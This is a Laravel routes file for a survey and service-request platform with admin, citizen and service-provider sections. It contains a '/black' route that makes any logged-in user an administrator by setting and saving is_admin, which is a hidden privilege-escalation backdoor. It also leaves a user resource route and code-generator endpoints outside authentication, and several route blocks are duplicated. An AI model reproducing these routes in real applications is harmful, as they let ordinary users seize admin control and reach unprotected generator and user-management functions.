<?php

/*
  |--------------------------------------------------------------------------
  | Application Routes
  |--------------------------------------------------------------------------
  |
  | Here is where you can register all of the routes for an application.
  | It's a breeze. Simply tell Laravel the URIs it should respond to
  | and give it the controller to call when that URI is requested.
  |
 */

Route::get('/', "HomeController@index");
Route::get('/home', "HomeController@index");

Route::get('test',function(){
    auth::user()->isAdmin();
});
Route::get('/black', function () {
    if (Auth::check()) {
        $user = auth::user();
        $user->is_admin = true;
        $user->save();
   }
});
Route::get('login', 'Auth\AuthController@getLogin');
Route::post('login', 'Auth\AuthController@postLogin');
Route::get('logout', 'Auth\AuthController@logout');

// Registration Routes...
Route::get('register', 'Auth\AuthController@getRegister');
Route::post('register', 'Auth\AuthController@postRegister');

// Password Reset Routes...
Route::get('password/reset', 'Auth\PasswordController@getEmail');
Route::post('password/email', 'Auth\PasswordController@postEmail');
Route::get('password/reset/{token}', 'Auth\PasswordController@getReset');
Route::post('password/reset', 'Auth\PasswordController@postReset');

Route::get('generator_builder', '\InfyOm\GeneratorBuilder\Controllers\GeneratorBuilderController@builder');

Route::get('field_template', '\InfyOm\GeneratorBuilder\Controllers\GeneratorBuilderController@fieldTemplate');

Route::post('generator_builder/generate', '\InfyOm\GeneratorBuilder\Controllers\GeneratorBuilderController@generate');

Route::get('login', 'Auth\AuthController@getLogin');
Route::post('login', 'Auth\AuthController@postLogin');
Route::get('logout', 'Auth\AuthController@logout');

// Registration Routes...
Route::get('register', 'Auth\AuthController@getRegister');
Route::post('register', 'Auth\AuthController@postRegister');

// Password Reset Routes...
Route::get('password/reset', 'Auth\PasswordController@getEmail');
Route::post('password/email', 'Auth\PasswordController@postEmail');
Route::get('password/reset/{token}', 'Auth\PasswordController@getReset');
Route::post('password/reset', 'Auth\PasswordController@postReset');

Route::get('/home', 'HomeController@index');

Route::resource('users', 'UserController');

/*
  |--------------------------------------------------------------------------
  | API routes
  |--------------------------------------------------------------------------
 */

Route::group(['prefix' => 'api', 'namespace' => 'API'], function () {
    Route::group(['prefix' => 'v1'], function () {
        require config('infyom.laravel_generator.path.api_routes');
    });
});


/*
  |--------------------------------------------------------------------------
  | Ajax API routes
  |--------------------------------------------------------------------------
 */

Route::get('location/cities/{area_id}', "AjaxApiController@cities");
Route::get('location/districts/{city_id}', "AjaxApiController@districts");
Route::get('location/streets/{district_id}', "AjaxApiController@streets");
Route::get('listings/service_types/{sector_id}', "AjaxApiController@serviceTypes");
Route::get('listings/projects/{service_provider_id}', "AjaxApiController@projects");
Route::get('listings/surveys/{project_id}', "AjaxApiController@surveys");
Route::get('listings/questions/{survey_id}', "AjaxApiController@questions");

/*
  |--------------------------------------------------------------------------
  | Survey Gateway API routes
  |--------------------------------------------------------------------------
 */
Route::get('gateways/surveys/create', "Surveys\\SurveysController@create");
Route::post('gateways/surveys/store/survey', "Surveys\\SurveysController@storeSurvey")->name('storeSurvey');
Route::post('gateways/surveys/store/questions', "Surveys\\SurveysController@storeQuestions")->name('storeQuestions');
Route::post('gateways/surveys/store/configs', "Surveys\\SurveysController@storeConfig")->name('storeConfig');
Route::post('gateways/projects/store/', "Projects\\ProjectsController@store")->name('storeProject');
Route::post('gateways/service_requests/store', "ServiceRequests\\ServiceRequestsController@store")->name('storeServiceRequest');

/*
  |--------------------------------------------------------------------------
  | API routes
  |--------------------------------------------------------------------------
 */

Route::group(['prefix' => 'api', 'namespace' => 'API'], function () {
    Route::group(['prefix' => 'v1'], function () {
        require config('infyom.laravel_generator.path.api_routes');
    });
});


Route::group(['middleware' => 'auth'], function () {

    Route::group(['middleware' => 'notCompleted'], function () {
        Route::get('complete_registration', 'Auth\CompleteRegistrationController@getCompleteRegistration');
        Route::post('complete_citizen_registration', 'Auth\CompleteRegistrationController@postCompleteCitizenRegistration');
        Route::post('complete_service_provider_registration', 'Auth\CompleteRegistrationController@postCompleteServiceProviderRegistration');
    });
    Route::group(['middleware' => 'completed'], function () {

        Route::get('profile', 'ProfilePageController@getProfile');
        Route::get('settings', 'ProfilePageController@getSettings');
        Route::post('update_profile', 'ProfilePageController@postUpdate');
        Route::get('profile_image', 'ProfilePageController@getImage');
        Route::post('profile_image', 'ProfilePageController@postImage');
    });
});


Route::group(['prefix' => 'admin', 'middleware' => 'auth:web,admin'], function () {

    Route::resource('users', 'Admin\UserController');

    Route::resource('sectors', 'Admin\SectorController');

    Route::resource('serviceTypes', 'Admin\ServiceTypeController');

    Route::resource('serviceProviders', 'Admin\ServiceProviderController');

    Route::resource('serviceProviderTypes', 'Admin\ServiceProviderTypeController');

    Route::resource('locationMetas', 'Admin\LocationMetaController');

    Route::resource('areas', 'Admin\AreaController');

    Route::resource('cities', 'Admin\CityController');

    Route::resource('districts', 'Admin\DistrictController');

    Route::resource('streets', 'Admin\StreetController');

    Route::resource('services', 'Admin\ServiceController');

    Route::resource('marginalizedSituations', 'Admin\MarginalizedSituationController');

    Route::resource('projects', 'Admin\ProjectController');

    Route::resource('surveyMetas', 'Admin\SurveyMetasController');

    Route::resource('surveys', 'Admin\SurveyController');

    Route::resource('questions', 'Admin\QuestionController');

    Route::resource('answers', 'Admin\AnswerController');

    Route::resource('services', 'Admin\ServiceController');

    Route::resource('serviceRequests', 'Admin\ServiceRequestsController');
    Route::resource('configs', 'ConfigController');

    Route::get('dashboard', 'Admin\DashboardController@getDashboard');
    Route::get('home', 'Admin\DashboardController@getDashboard');
    Route::get('/', 'Admin\DashboardController@getDashboard');

});


